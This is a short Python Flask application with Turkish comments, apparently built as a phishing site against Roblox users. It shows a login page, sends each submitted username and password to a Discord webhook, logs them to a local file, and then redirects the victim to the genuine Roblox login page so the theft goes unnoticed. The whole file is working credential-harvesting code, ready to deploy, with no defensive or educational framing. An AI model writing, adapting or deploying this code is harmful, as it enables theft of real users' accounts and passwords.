from flask import Flask, render_template, request, redirect
import requests # Discord'a veri atmak için

app = Flask(__name__)

# Discord Webhook URL'ni buraya yapıştır
DISCORD_WEBHOOK_URL = "SENIN_WEBHOOK_URLN"

@app.route('/')
def index():
    return render_template('login.html') # Giriş sayfasını açar

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('username')
    pw = request.form.get('password')

    # 1. Veriyi Discord'a Gönder
    data = {
        "content": f"🚀 **Yeni Veri Geldi!**\n**Kullanıcı:** {user}\n**Şifre:** {pw}"
    }
    requests.post(DISCORD_WEBHOOK_URL, json=data)

    # 2. Veriyi Sunucuda Bir Dosyaya Kaydet
    with open("loglar.txt", "a") as f:
        f.write(f"User: {user} | Pass: {pw}\n")

    # 3. Kullanıcıyı Orijinal Roblox'a Yönlendir
    return redirect("https://www.roblox.com/login")

if __name__ == "__main__":
    # Render portu otomatik atar, o yüzden portu os.environ'dan alıyoruz
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
